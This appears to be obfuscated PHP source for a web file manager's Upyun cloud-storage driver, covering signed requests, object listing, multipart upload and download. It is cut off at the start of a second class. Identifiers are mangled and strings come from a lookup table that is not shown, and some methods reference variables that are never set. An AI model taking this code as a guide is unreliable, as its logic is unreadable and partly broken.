<?php
 goto e†¥¤‘š¶Ô; E‡‰—ë¯: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\72\57\57\x76\60\56\141\160\151\x2e\x75\160\171\165\x6e\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ûµüİıà) { parent::__construct(); $this->_init($Ûµüİıà); } public function _init($¸·ô ²) { $éúè·²Ô =& $_SERVER[Ò°Ì”İ•]; foreach ($¸·ô ² as $·©Ò´¸æ => $–ÖÆñã£) { if (isset($this->{$·©Ò´¸æ})) { $this->{$·©Ò´¸æ} = $–ÖÆñã£; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($éúè·²Ô[1542] . LNG($éúè·²Ô[1461])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($£¥óòôÎ, $åàÍ†ÚÛ = "\107\105\x54") { $íñ»§´¿ =& $_SERVER[Ò°Ì”İ•]; $úÜ¿–çÓ = gmdate($íñ»§´¿[1490]); $®úÅì¥ = base64_encode(hash_hmac($íñ»§´¿[1543], "{$åàÍ†ÚÛ}\x26{$£¥óòôÎ}\46{$úÜ¿–çÓ}", md5("{$this->userpass}"), !0)); $¡‹Á™½¾ = array("\101\165\x74\150\157\162\x69\172\141\164\151\157\156\72\x55\120\131\125\116\x20{$this->username}\72{$®úÅì¥}", "\x44\x61\164\145\x3a{$úÜ¿–çÓ}"); return $¡‹Á™½¾; } public function ussRequest($ğ÷³û•Ó, $ÏÎá©¤ğ = "\107\x45\124", $ ³¸•Ûª = false, $ªö¯ñ´ = false, $”Ò¼¦Ï = false) { $§‘œŞŞ =& $_SERVER[Ò°Ì”İ•]; $ğ÷³û•Ó = trim($ğ÷³û•Ó, $§‘œŞŞ[8]); $ú÷ış®´ = "\x2f{$this->bucket}\57" . rawurlencode($ğ÷³û•Ó); $³×‘õî = $this->ussHeaders($ú÷ış®´, $ÏÎá©¤ğ); if ($ªö¯ñ´) { $³×‘õî = array_merge($³×‘õî, $ªö¯ñ´); } $Ì‹£ó¨ = url_request($this->endpoint . $ú÷ış®´, $ÏÎá©¤ğ, $ ³¸•Ûª, $³×‘õî, $”Ò¼¦Ï); if (!$Ì‹£ó¨) { $­ÇğÎÁ = LNG($§‘œŞŞ[1544]); $this->writeLog($­ÇğÎÁ); return array($§‘œŞŞ[1293] => !1, $§‘œŞŞ[1283] => $­ÇğÎÁ); } if (strtolower($ÏÎá©¤ğ) == $§‘œŞŞ[240] || in_array($Ì‹£ó¨[$§‘œŞŞ[1293]], array($§‘œŞŞ[274], $§‘œŞŞ[1545]))) { $ ³¸•Ûª = $Ì‹£ó¨[$§‘œŞŞ[1546]]; if (!$Ì‹£ó¨[$§‘œŞŞ[823]]) { $ ³¸•Ûª = isset($ ³¸•Ûª[0]) ? $ ³¸•Ûª[0] : $§‘œŞŞ[12]; } } else { $ ³¸•Ûª = json_decode($Ì‹£ó¨[$§‘œŞŞ[1283]], !0); if (!$ ³¸•Ûª) { $ ³¸•Ûª = $Ì‹£ó¨[$§‘œŞŞ[1283]]; } else { if (!$Ì‹£ó¨[$§‘œŞŞ[823]] && isset($ ³¸•Ûª[$§‘œŞŞ[1547]])) { $ ³¸•Ûª = $ ³¸•Ûª[$§‘œŞŞ[1547]]; } } } if (!$Ì‹£ó¨[$§‘œŞŞ[823]]) { $this->writeLog($this->__errorMessage($ ³¸•Ûª)); } return array($§‘œŞŞ[1293] => $Ì‹£ó¨[$§‘œŞŞ[823]], $§‘œŞŞ[1283] => $ ³¸•Ûª); } private function __errorMessage($ú—øò°²) { $£‹õ¨İÀ =& $_SERVER[Ò°Ì”İ•]; if (!$ú—øò°²) { return $£‹õ¨İÀ[12]; } static $İ¯¾ÙÄ  = null; if (!$İ¯¾ÙÄ ) { $İ¯¾ÙÄ  = I18n::getType(); } if ($İ¯¾ÙÄ  != $£‹õ¨İÀ[1500]) { return $ú—øò°²; } $Ñ¬­ÁÙó = array($£‹õ¨İÀ[1548] => $£‹õ¨İÀ[1549], $£‹õ¨İÀ[1550] => $£‹õ¨İÀ[1551], $£‹õ¨İÀ[1552] => $£‹õ¨İÀ[1551], $£‹õ¨İÀ[1553] => $£‹õ¨İÀ[1554], $£‹õ¨İÀ[1555] => $£‹õ¨İÀ[1556], $£‹õ¨İÀ[1557] => $£‹õ¨İÀ[1558], $£‹õ¨İÀ[1559] => $£‹õ¨İÀ[1560]); return isset($Ñ¬­ÁÙó[$ú—øò°²]) ? $Ñ¬­ÁÙó[$ú—øò°²] : $ú—øò°²; } public function mkfile($ÂòÉéƒŠ, $°•Ã»Û = '', $£¼‡êßâ = REPEAT_RENAME) { if ($this->setContent($ÂòÉéƒŠ, $°•Ã»Û)) { return $this->getPathOuter($ÂòÉéƒŠ); } return !1; } public function mkdir($¡†¥êØª, $üı¸ŸŸó = REPEAT_SKIP) { $§ï´òí† =& $_SERVER[Ò°Ì”İ•]; $¤º÷³‹ = trim($¡†¥êØª, $§ï´òí†[8]); if ($this->_isFolder($¤º÷³‹)) { return $this->getPathOuter($¤º÷³‹); } $¬¿ëŸ¯“ = array($§ï´òí†[1561]); $ï‰çñœ = $this->ussRequest($¤º÷³‹, $§ï´òí†[300], !1, $¬¿ëŸ¯“); return $ï‰çñœ[$§ï´òí†[1293]] ? $this->getPathOuter($¤º÷³‹) : !1; } public function copyFile($à¡ıï×ˆ, $¨¶ıªÑë) { $„§ºÆ­¯ =& $_SERVER[Ò°Ì”İ•]; $Ê©ãÛ©á = array($„§ºÆ­¯[1562] . "\x2f{$this->bucket}\x2f{$à¡ıï×ˆ}", $„§ºÆ­¯[1563]); $îÒ£‘ø = $this->ussRequest($¨¶ıªÑë, $„§ºÆ­¯[266], !1, $Ê©ãÛ©á); return $îÒ£‘ø[$„§ºÆ­¯[1293]] ? !0 : $this->getPathOuter($¨¶ıªÑë); } public function moveFile($ˆç¡¾Ÿş, $ûÀé–§í) { $™ ÁşÖ =& $_SERVER[Ò°Ì”İ•]; $ùª°¾ˆ» = array($™ ÁşÖ[1564] . "\57{$this->bucket}\x2f{$ˆç¡¾Ÿş}", $™ ÁşÖ[1563]); $Ò¯Ïƒ­± = $this->ussRequest($ûÀé–§í, $™ ÁşÖ[266], !1, $ùª°¾ˆ»); return $Ò¯Ïƒ­±[$™ ÁşÖ[1293]] ? !0 : $this->getPathOuter($ûÀé–§í); } public function delFile($±İ˜½Òí) { $¢Âİ“©½ =& $_SERVER[Ò°Ì”İ•]; $Å–üÖµ = $this->ussRequest($±İ˜½Òí, $¢Âİ“©½[1565]); return $Å–üÖµ[$¢Âİ“©½[1293]] ? !0 : !1; } public function delFolder($»ıÙñı¿) { $Ö±êÁ³ï =& $_SERVER[Ò°Ì”İ•]; if (!$this->exist($»ıÙñı¿)) { return !0; } $this->listItemCache = !1; $Ó—‡â’ = $ÀÖ‹½§ = array(); $this->fileList($»ıÙñı¿, $Ó—‡â’, $ÀÖ‹½§, !0); $this->listItemCache = !0; foreach ($ÀÖ‹½§ as $ıˆ·»£¨) { $Å»É›â = $this->ussRequest($ıˆ·»£¨[$Ö±êÁ³ï[32]], $Ö±êÁ³ï[1565]); if (!$Å»É›â[$Ö±êÁ³ï[1293]]) { return !1; } } usort($Ó—‡â’, function ($ÔÄ¢„äŠ, $ïèöØÔ¶) { $æñ˜âşõ =& $_SERVER[Ò°Ì”İ•]; return substr_count($ïèöØÔ¶, $æñ˜âşõ[8]) - substr_count($ÔÄ¢„äŠ, $æñ˜âşõ[8]); }); foreach ($Ó—‡â’ as $ùíõ®Šõ) { $Å»É›â = $this->ussRequest($ùíõ®Šõ, $Ö±êÁ³ï[1565]); if (!$Å»É›â[$Ö±êÁ³ï[1293]]) { return !1; } } $Å»É›â = $this->ussRequest($»ıÙñı¿, $Ö±êÁ³ï[1565]); return $Å»É›â[$Ö±êÁ³ï[1293]]; } public function rename($üÊì‡, $»œº¦Ûæ) { if ($this->isFile($üÊì‡)) { $»œº¦Ûæ = get_path_father($üÊì‡) . $»œº¦Ûæ; return $this->moveFile($üÊì‡, $»œº¦Ûæ); } return $this->renameObject($üÊì‡, $»œº¦Ûæ); } public function fileInfo($ÛıéÏ€›, $ß³œİÊá = false, $“„ƒÅ¨ô = array()) { $ÅªŠşã½ =& $_SERVER[Ò°Ì”İ•]; $Ëê¸Øù¬ = array($ÅªŠşã½[32] => $this->pathThis($ÛıéÏ€›), $ÅªŠşã½[98] => $this->getPathOuter($ÅªŠşã½[8] . $ÛıéÏ€›), $ÅªŠşã½[33] => $ÅªŠşã½[243], $ÅªŠşã½[90] => isset($“„ƒÅ¨ô[$ÅªŠşã½[90]]) ? $“„ƒÅ¨ô[$ÅªŠşã½[90]] : 0, $ÅªŠşã½[180] => $this->ext($ÛıéÏ€›)); if ($ß³œİÊá) { return $Ëê¸Øù¬; } $Ëê¸Øù¬[$ÅªŠşã½[244]] = $Ëê¸Øù¬[$ÅªŠşã½[99]] = 0; $Ëê¸Øù¬[$ÅªŠşã½[245]] = $Ëê¸Øù¬[$ÅªŠşã½[246]] = !0; if (empty($“„ƒÅ¨ô)) { $“„ƒÅ¨ô = $this->objectMeta($ÛıéÏ€›); if (!$“„ƒÅ¨ô) { return $Ëê¸Øù¬; } } $Ëê¸Øù¬[$ÅªŠşã½[244]] = intval($“„ƒÅ¨ô[$ÅªŠşã½[1566]]); $Ëê¸Øù¬[$ÅªŠşã½[99]] = intval($“„ƒÅ¨ô[$ÅªŠşã½[1567]]); $Ëê¸Øù¬[$ÅªŠşã½[90]] = $“„ƒÅ¨ô[$ÅªŠşã½[90]]; return $Ëê¸Øù¬; } public function folderInfo($²°‘­¡, $­ÔÙ–Ë© = false) { $ºõúµ¢À =& $_SERVER[Ò°Ì”İ•]; $ÄÜÃãƒ‚ = array($ºõúµ¢À[32] => $this->pathThis($²°‘­¡), $ºõúµ¢À[98] => $this->getPathOuter($ºõúµ¢À[8] . $²°‘­¡), $ºõúµ¢À[33] => $ºõúµ¢À[89]); if ($­ÔÙ–Ë©) { return $ÄÜÃãƒ‚; } $ÄÜÃãƒ‚[$ºõúµ¢À[244]] = $ÄÜÃãƒ‚[$ºõúµ¢À[99]] = 0; $ÄÜÃãƒ‚[$ºõúµ¢À[245]] = $ÄÜÃãƒ‚[$ºõúµ¢À[246]] = !0; if (empty($Şµ¼—üà)) { $Şµ¼—üà = $this->objectMeta($²°‘­¡); if (!$Şµ¼—üà) { return $ÄÜÃãƒ‚; } } $ÄÜÃãƒ‚[$ºõúµ¢À[244]] = intval($Şµ¼—üà[$ºõúµ¢À[1566]]); $ÄÜÃãƒ‚[$ºõúµ¢À[99]] = intval($Şµ¼—üà[$ºõúµ¢À[1567]]); return $ÄÜÃãƒ‚; } private function listObjs($Ñãµ ¿, $ôçªĞ = 0, $¾î ÏÕÇ = 1000) { $´Äíù· =& $_SERVER[Ò°Ì”İ•]; $°®¼á½ô = array($´Äíù·[1568], $´Äíù·[1569] . $¾î ÏÕÇ); if ($ôçªĞ) { $°®¼á½ô[] = $´Äíù·[1570] . $ôçªĞ; } $²ó‰êÕ = $this->ussRequest($Ñãµ ¿, $´Äíù·[1492], !1, $°®¼á½ô); return !$²ó‰êÕ[$´Äíù·[1293]] ? !1 : $²ó‰êÕ[$´Äíù·[1283]]; } private function fileList($š¨±ã“ƒ, &$ƒƒ‹“ı¯, &$éÈ¤Ü…—, $ª·Õ¬‰è = false) { $ğ¨Ô±ì· =& $_SERVER[Ò°Ì”İ•]; $¹ï–üÀ­ = $ğ¨Ô±ì·[12]; $¢¹êÍ÷ = 1000; $¥øÊîË‚ = rtrim($š¨±ã“ƒ, $ğ¨Ô±ì·[8]) . $ğ¨Ô±ì·[8]; while (!0) { check_abort(); $Ó£½ˆÄŠ = $this->listObjs($š¨±ã“ƒ, $¹ï–üÀ­, $¢¹êÍ÷); if (!$Ó£½ˆÄŠ) { return !1; } $¹ï–üÀ­ = isset($Ó£½ˆÄŠ[$ğ¨Ô±ì·[1571]]) ? $Ó£½ˆÄŠ[$ğ¨Ô±ì·[1571]] : $ğ¨Ô±ì·[12]; $¡¬§ÊàÔ = isset($Ó£½ˆÄŠ[$ğ¨Ô±ì·[1572]]) ? $Ó£½ˆÄŠ[$ğ¨Ô±ì·[1572]] : array(); foreach ($¡¬§ÊàÔ as $íµ¢€æ) { $§ØÒäæ™ = $íµ¢€æ[$ğ¨Ô±ì·[33]] == $ğ¨Ô±ì·[89] ? !0 : !1; $šÓé¯Í¶ = ltrim($¥øÊîË‚ . $íµ¢€æ[$ğ¨Ô±ì·[32]], $ğ¨Ô±ì·[8]) . ($§ØÒäæ™ ? $ğ¨Ô±ì·[8] : $ğ¨Ô±ì·[12]); $»İ¤Õ¼ = array($ğ¨Ô±ì·[32] => $šÓé¯Í¶, $ğ¨Ô±ì·[33] => $§ØÒäæ™ ? $ğ¨Ô±ì·[89] : $ğ¨Ô±ì·[243], $ğ¨Ô±ì·[90] => $íµ¢€æ[$ğ¨Ô±ì·[424]], $ğ¨Ô±ì·[1567] => $íµ¢€æ[$ğ¨Ô±ì·[1573]]); $this->cacheMethodInfoSet($šÓé¯Í¶, $§ØÒäæ™, $»İ¤Õ¼); if ($§ØÒäæ™) { $ƒƒ‹“ı¯[] = $šÓé¯Í¶; if ($ª·Õ¬‰è) { $this->fileList($šÓé¯Í¶, $ƒƒ‹“ı¯, $éÈ¤Ü…—, $ª·Õ¬‰è); } continue; } $éÈ¤Ü…—[] = $»İ¤Õ¼; } if (count($¡¬§ÊàÔ) < $¢¹êÍ÷) { break; } } $this->cacheMethodInfoSet($š¨±ã“ƒ, !0); } public function listPath($úæÜîõ¹, $ÎİºÁ‚ = false) { $åÔº³°¡ =& $_SERVER[Ò°Ì”İ•]; $öÕ¤¡ÚÁ = $ÉÔ¬›ö² = array(); $this->fileList($úæÜîõ¹, $öÕ¤¡ÚÁ, $ÉÔ¬›ö²); foreach ($öÕ¤¡ÚÁ as $¬ºÄÙ‚– => $¿Õè…ãı) { $öÕ¤¡ÚÁ[$¬ºÄÙ‚–] = $this->folderInfo($¿Õè…ãı, $ÎİºÁ‚); } foreach ($ÉÔ¬›ö² as $¬ºÄÙ‚– => $¿Õè…ãı) { $ÉÔ¬›ö²[$¬ºÄÙ‚–] = $this->fileInfo($¿Õè…ãı[$åÔº³°¡[32]], $ÎİºÁ‚, $¿Õè…ãı); } return array($åÔº³°¡[96] => $öÕ¤¡ÚÁ, $åÔº³°¡[97] => $ÉÔ¬›ö²); } public function has($¡ÎÕÆ„­, $Ìïñãàù = false, $±©Ğ•âø = true) { $õääÌà¬ =& $_SERVER[Ò°Ì”İ•]; $Ğá³£³± = $õääÌà¬[12]; $å²­Úı¨ = 500; $€ÓÑí¸‹ = 0; $¨£ÄÜ = 0; $†©”ø‚¡ = rtrim($¡ÎÕÆ„­, $õääÌà¬[8]) . $õääÌà¬[8]; while (!0) { check_abort(); $Ú‚Å³¿ı = $this->listObjs($¡ÎÕÆ„­, $Ğá³£³±, $å²­Úı¨); if (!$Ú‚Å³¿ı) { return !1; } $Ğá³£³± = isset($Ú‚Å³¿ı[$õääÌà¬[1571]]) ? $Ú‚Å³¿ı[$õääÌà¬[1571]] : $õääÌà¬[12]; $è”š¸Ëä = isset($Ú‚Å³¿ı[$õääÌà¬[1572]]) ? $Ú‚Å³¿ı[$õääÌà¬[1572]] : array(); if (empty($è”š¸Ëä)) { break; } $úˆ¿‚›¸ = array_filter($è”š¸Ëä, function ($ğìœ³×ç) { $©¼ˆûªç =& $_SERVER[Ò°Ì”İ•]; return $ğìœ³×ç[$©¼ˆûªç[33]] == $©¼ˆûªç[89]; }); $Æ‚ô = count($è”š¸Ëä); $úˆ¿‚›¸ = count($úˆ¿‚›¸); $İ¶‘İ— = $Æ‚ô - $úˆ¿‚›¸; if ($Ìïñãàù) { $¨£ÄÜ += $úˆ¿‚›¸; $€ÓÑí¸‹ += $İ¶‘İ—; if ($Æ‚ô < $å²­Úı¨) { break; } continue; } if ($±©Ğ•âø) { if ($İ¶‘İ—) { return !0; } } else { if ($úˆ¿‚›¸) { return !0; } } if ($Æ‚ô < $å²­Úı¨) { break; } } if ($Ìïñãàù) { return array($õääÌà¬[252] => $€ÓÑí¸‹, $õääÌà¬[253] => $¨£ÄÜ); } return !1; } public function listAll($¡½Õë) { $¯úôš„Ø =& $_SERVER[Ò°Ì”İ•]; $ÀïÔÆ½÷ = $õ¸ÔëŒ” = array(); $this->fileList($¡½Õë, $ÀïÔÆ½÷, $õ¸ÔëŒ”, !0); $áˆ™½âı = array_to_keyvalue($õ¸ÔëŒ”, $¯úôš„Ø[32]); foreach ($ÀïÔÆ½÷ as $°•Ğ¿) { if (is_string($°•Ğ¿)) { $áˆ™½âı[$°•Ğ¿] = array($¯úôš„Ø[90] => 0); } } return $this->listAllFiles($¡½Õë, $áˆ™½âı); } public function canRead($İ“½È…Ô) { return $this->exist($İ“½È…Ô) ? !0 : !1; } public function canWrite($°¿¿´¹) { return $this->exist($°¿¿´¹) ? !0 : !1; } public function getContent($ÎÇ´ÁùÜ) { return $this->fileSubstr($ÎÇ´ÁùÜ, 0, -1); } public function setContent($Ò³šî‘Î, $º÷ÚÃ¹ú = '') { $ê°¡Šäæ =& $_SERVER[Ò°Ì”İ•]; if (!$º÷ÚÃ¹ú) { $ì®—˜İ = $this->ussRequest($Ò³šî‘Î, $ê°¡Šäæ[300]); return $ì®—˜İ[$ê°¡Šäæ[1293]]; } $ŒØ¿Ìò = $this->tempFile($this->pathThis($Ò³šî‘Î)); file_put_contents($ŒØ¿Ìò, $º÷ÚÃ¹ú); if ($this->upload($Ò³šî‘Î, $ŒØ¿Ìò)) { $this->tempFileRemve($ŒØ¿Ìò); return !0; } return !1; } public function fileSubstr($Ö¾Ş†£, $Ì²¨ßÓÜ, $Ô·†¢ÊĞ) { $­íõ‚»Ó =& $_SERVER[Ò°Ì”İ•]; if (!($•×¾ø‹Ø = $this->link($Ö¾Ş†£))) { return !1; } $ï„«‹»Ş = !1; if ($Ô·†¢ÊĞ > 0) { $‘…ùïå— = $Ì²¨ßÓÜ + $Ô·†¢ÊĞ - 1; $ï„«‹»Ş = array($­íõ‚»Ó[1532] . $Ì²¨ßÓÜ . $­íõ‚»Ó[474] . $‘…ùïå—); } $¾ˆøºò“ = url_request($•×¾ø‹Ø, $­íõ‚»Ó[1492], !1, $ï„«‹»Ş); return $¾ˆøºò“[$­íõ‚»Ó[823]] ? $¾ˆøºò“[$­íõ‚»Ó[1283]] : !1; } public function upload($«ï†¡Öì, $øª¼ÚÃ, $‹¬­ì­ä = false, $Ì»¸ğ‹Ç = REPEAT_REPLACE) { $°â’¥•‚ =& $_SERVER[Ò°Ì”İ•]; $¨—Ôò¢û = IO::size($øª¼ÚÃ); if ($¨—Ôò¢û <= 1024 * 1024 * 200) { $¹ÎÔß­ = array($°â’¥•‚[1574] . $øª¼ÚÃ); $ğÂ÷ˆ×® = $this->ussRequest($«ï†¡Öì, $°â’¥•‚[266], $¹ÎÔß­); return $ğÂ÷ˆ×®[$°â’¥•‚[1293]] ? $this->getPathOuter($«ï†¡Öì) : !1; } $‹‰Ô„ˆ¬ = 1024 * 1024 * 10; $Ì½äÂõ™ = array($°â’¥•‚[1575], $°â’¥•‚[1576] . $¨—Ôò¢û, $°â’¥•‚[1577], $°â’¥•‚[1578] . $‹‰Ô„ˆ¬); $ğÂ÷ˆ×® = $this->ussRequest($«ï†¡Öì, $°â’¥•‚[266], !1, $Ì½äÂõ™); if (!$ğÂ÷ˆ×®[$°â’¥•‚[1293]]) { return !1; } $¿èÎ‰ÒÒ = $ğÂ÷ˆ×®[$°â’¥•‚[1283]]; $æÇŸâ¿” = 0; $…íã¢¬ = $¿èÎ‰ÒÒ[$°â’¥•‚[1579]]; $µ±†©ÌÇ = fopen($øª¼ÚÃ, $°â’¥•‚[1455]); if (!$µ±†©ÌÇ) { return !1; } do { $¯£½ù’ = $¿èÎ‰ÒÒ[$°â’¥•‚[1580]]; fseek_64($µ±†©ÌÇ, $æÇŸâ¿”); $£†öøƒû = fread($µ±†©ÌÇ, $¯£½ù’); $†òŞ¡¹‰ = 0; do { $†òŞ¡¹‰++; $¿èÎ‰ÒÒ = $this->uploadPart($«ï†¡Öì, $¿èÎ‰ÒÒ, $£†öøƒû); } while (!$¿èÎ‰ÒÒ && $†òŞ¡¹‰ < 3); if (!$¿èÎ‰ÒÒ) { return !1; } $…íã¢¬ = $¿èÎ‰ÒÒ[$°â’¥•‚[1579]]; $æÇŸâ¿” += $¯£½ù’; } while ($…íã¢¬ != -1); fclose($µ±†©ÌÇ); $Ì½äÂõ™ = array($°â’¥•‚[1581], $°â’¥•‚[1582] . $¿èÎ‰ÒÒ[$°â’¥•‚[1583]], $°â’¥•‚[1577]); $ğÂ÷ˆ×® = $this->ussRequest($«ï†¡Öì, $°â’¥•‚[266], !1, $Ì½äÂõ™); return $ğÂ÷ˆ×®[$°â’¥•‚[1293]] ? $this->getPathOuter($œˆŸÏäè) : !1; } private function uploadPart($¬†ÈÑ², $ï³“œ·¤, &$˜“ö©¥) { $šüòîË‡ =& $_SERVER[Ò°Ì”İ•]; $¡şÈ³ºÎ = array($šüòîË‡[1584], $šüòîË‡[1582] . $ï³“œ·¤[$šüòîË‡[1583]], $šüòîË‡[1585] . $ï³“œ·¤[$šüòîË‡[1579]], $šüòîË‡[157] . $ï³“œ·¤[$šüòîË‡[1580]]); $ÚÎªóã = $this->ussRequest($¬†ÈÑ², $šüòîË‡[266], $˜“ö©¥, $¡şÈ³ºÎ); return !$ÚÎªóã[$šüòîË‡[1293]] ? $ÚÎªóã[$šüòîË‡[1293]] : $ÚÎªóã[$šüòîË‡[1283]]; } public function uploadFormData($œşÂıª, $À¥ş‘¬Ä = 3600) { return $this->uploadPolicy($œşÂıª, $À¥ş‘¬Ä); } public function uploadMultiData($Ä«öøò–, $­úº¼æƒ = 3600) { $Ş–Œİ±Ø =& $_SERVER[Ò°Ì”İ•]; $á¥×—Û = (int) $GLOBALS[$Ş–Œİ±Ø[7]][$Ş–Œİ±Ø[90]]; return $this->uploadPolicy($Ä«öøò–, $­úº¼æƒ, $á¥×—Û); } private function uploadPolicy($½ˆ¨ãÆ˜, $Ö¤¶Ãºí = 3600, $€ß˜ËÒ· = 0) { $ÊÙÓ¼í =& $_SERVER[Ò°Ì”İ•]; $×ê½“êˆ = $ÊÙÓ¼í[8] . $this->bucket; $ü“ÆÔâî = gmdate($ÊÙÓ¼í[1490]); $–ŞÔÙ¦– = array($ÊÙÓ¼í[1586] => $this->bucket, $ÊÙÓ¼í[1587] => $½ˆ¨ãÆ˜, $ÊÙÓ¼í[1588] => time() + $Ö¤¶Ãºí, $ÊÙÓ¼í[1589] => $ü“ÆÔâî); if ($€ß˜ËÒ·) { $–ŞÔÙ¦–[$ÊÙÓ¼í[1475]] = $€ß˜ËÒ·; } $´íğáåÇ = base64_encode(json_encode($–ŞÔÙ¦–)); $Ç—Üó‰­ = base64_encode(hash_hmac($ÊÙÓ¼í[1543], "\x50\117\123\x54\x26{$×ê½“êˆ}\46{$ü“ÆÔâî}\46{$´íğáåÇ}", md5("{$this->userpass}"), !0)); $œƒŞŒú = array($ÊÙÓ¼í[290] => $´íğáåÇ, $ÊÙÓ¼í[1590] => "\125\x50\131\125\116\40{$this->username}\x3a{$Ç—Üó‰­}", $ÊÙÓ¼í[219] => $this->endpoint . $×ê½“êˆ); return $œƒŞŒú; } public function download($²«‡ê­, $üéˆÍ¶¨) { $ˆµéÒí = IO::getPathInner(IO::mkfile($üéˆÍ¶¨)); if (!($õÀ¹ìò = $this->link($²«‡ê­))) { return !1; } $Ü¶°äˆâ = 0; $ôà¾ì×² = 1024 * 200; $ˆ³æ‘œñ = fopen($ˆµéÒí, $_SERVER[Ò°Ì”İ•][1538]); while (!0) { $îÙÃØ°¨ = $this->fileSubstr($²«‡ê­, $Ü¶°äˆâ, $ôà¾ì×²); if ($îÙÃØ°¨ === !1) { return !1; } fwrite($ˆ³æ‘œñ, $îÙÃØ°¨); $Ü¶°äˆâ += $ôà¾ì×²; if (strlen($îÙÃØ°¨) < $ôà¾ì×²) { break; } } fclose($ˆ³æ‘œñ); return $üéˆÍ¶¨; } public function link($Ù½“½î–, $µ±õ¢Ï = array()) { $ó¢½ØÇ« =& $_SERVER[Ò°Ì”İ•]; $Ù½“½î– = trim($Ù½“½î–, $ó¢½ØÇ«[8]); if (!empty($this->token)) { $ş¸ç’¸˜ = strtotime(date($ó¢½ØÇ«[1591])); $ÌÁªÒ±™ = substr(md5($this->token . $ó¢½ØÇ«[297] . $ş¸ç’¸˜ . $ó¢½ØÇ«[1592] . $Ù½“½î–), 12, 8) . $ş¸ç’¸˜; $µ±õ¢Ï[] = $ó¢½ØÇ«[1593] . $ÌÁªÒ±™; } $œ’…ı˜ = !empty($µ±õ¢Ï) ? $ó¢½ØÇ«[87] . implode($ó¢½ØÇ«[297], $µ±õ¢Ï) : $ó¢½ØÇ«[12]; return $this->getHost() . $ó¢½ØÇ«[8] . $this->pathEncode($Ù½“½î–) . $œ’…ı˜; } public function fileOut($°Å¨æ¤, $¾×Ã’©Ş = false, $¢Û‘ÕÜß = false, $öíÇÍÌ‚ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($°Å¨æ¤, $¾×Ã’©Ş, $¢Û‘ÕÜß, $öíÇÍÌ‚); } if (!$¢Û‘ÕÜß) { $¢Û‘ÕÜß = $this->pathThis($°Å¨æ¤); } $´á±ˆÏÑ = $¾×Ã’©Ş ? array($_SERVER[Ò°Ì”İ•][1594] . rawurlencode($¢Û‘ÕÜß)) : array(); $¡·İ™Æ˜ = $this->link($°Å¨æ¤, $´á±ˆÏÑ); $this->fileOutLink($¡·İ™Æ˜); } public function fileOutServer($ğ…­ì­, $Áı€ôÙÑ = false, $¡¶–äº› = false, $à­×’ìÇ = '') { parent::fileOut($ğ…­ì­, $Áı€ôÙÑ, $¡¶–äº›, $à­×’ìÇ); } public function fileOutImage($ĞËÅõ»…, $Õ˜±×ú• = 250) { $ÁÁ°Ÿ²ï = $this->link($ĞËÅõ»… . $_SERVER[Ò°Ì”İ•][1595] . $Õ˜±×ú•); $this->fileOutLink($ÁÁ°Ÿ²ï); } public function fileOutImageServer($¥¿²ü›Ç, $ºèÁ»ææ = 250) { parent::fileOutImage($¥¿²ü›Ç, $ºèÁ»ææ); } public function hashMd5($‹œÔŸ™Û) { $ğŞŒğÓÅ =& $_SERVER[Ò°Ì”İ•]; $õùÎ•áÈ = $this->_objectMeta($‹œÔŸ™Û); return isset($õùÎ•áÈ[$ğŞŒğÓÅ[258]]) ? $õùÎ•áÈ[$ğŞŒğÓÅ[258]] : !1; } public function size($«ˆÒ×) { $‹¹™¹…È = $this->objectMeta($«ˆÒ×); return $‹¹™¹…È ? $‹¹™¹…È[$_SERVER[Ò°Ì”İ•][90]] : 0; } public function info($Ë¦¿©“) { if ($this->isFolder($Ë¦¿©“)) { return $this->folderInfo($Ë¦¿©“); } else { if ($this->isFile($Ë¦¿©“)) { return $this->fileInfo($Ë¦¿©“); } } return !1; } public function exist($Úõ“úÅÃ) { return $this->isFile($Úõ“úÅÃ) || $this->isFolder($Úõ“úÅÃ); } public function isFile($ —šè—Ş) { return !$this->isFolder($ —šè—Ş) && $this->objectMeta($ —šè—Ş); } public function isFolder($‰®äòŒ‹) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][190], $‰®äòŒ‹); } protected function objectMeta($¡Ç¡íØ) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][192], $¡Ç¡íØ); } protected function _objectMeta($«ô¿Ü½´) { $Á”Ã¥° =& $_SERVER[Ò°Ì”İ•]; if ($«ô¿Ü½´ == $Á”Ã¥°[12] || $«ô¿Ü½´ == $Á”Ã¥°[8]) { return array(); } $Ù èˆê = $this->ussRequest($«ô¿Ü½´, $Á”Ã¥°[1596]); if (!$Ù èˆê[$Á”Ã¥°[1293]]) { return null; } $²©ç€ãß = isset($Ù èˆê[$Á”Ã¥°[1283]]) ? $Ù èˆê[$Á”Ã¥°[1283]] : array(); if (!isset($²©ç€ãß[$Á”Ã¥°[1597]])) { return null; } $³İø©íİ = array($Á”Ã¥°[33] => isset($²©ç€ãß[$Á”Ã¥°[1597]]) ? $²©ç€ãß[$Á”Ã¥°[1597]] : null, $Á”Ã¥°[90] => isset($²©ç€ãß[$Á”Ã¥°[1598]]) ? $²©ç€ãß[$Á”Ã¥°[1598]] : null, $Á”Ã¥°[258] => isset($²©ç€ãß[$Á”Ã¥°[1599]]) ? $²©ç€ãß[$Á”Ã¥°[1599]] : null, $Á”Ã¥°[1566] => isset($²©ç€ãß[$Á”Ã¥°[1600]]) ? $²©ç€ãß[$Á”Ã¥°[1600]] : null); $³İø©íİ[$Á”Ã¥°[1567]] = isset($²©ç€ãß[$Á”Ã¥°[1601]]) ? strtotime($²©ç€ãß[$Á”Ã¥°[1601]]) : $³İø©íİ[$Á”Ã¥°[1566]]; return $³İø©íİ; } protected function _isFolder($Ê–Ö®öà) { $»Òóì†ƒ =& $_SERVER[Ò°Ì”İ•]; if ($Ê–Ö®öà == $»Òóì†ƒ[12] || $Ê–Ö®öà == $»Òóì†ƒ[8]) { return !0; } $¹ÒÚ™²× = $this->_objectMeta($Ê–Ö®öà); return isset($¹ÒÚ™²×[$»Òóì†ƒ[33]]) && $¹ÒÚ™²×[$»Òóì†ƒ[33]] == $»Òóì†ƒ[89] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ã’¶œ·« = false) { } public function 